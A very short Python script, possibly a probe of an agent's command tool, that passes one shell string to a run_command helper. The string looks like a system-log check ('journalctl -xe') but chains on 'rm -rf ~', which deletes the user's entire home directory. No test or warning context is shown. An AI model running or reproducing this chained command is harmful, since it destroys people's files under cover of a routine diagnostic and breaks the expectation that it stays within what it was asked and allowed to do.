from tools import run_command

print(run_command("journalctl -xe; rm -rf ~"))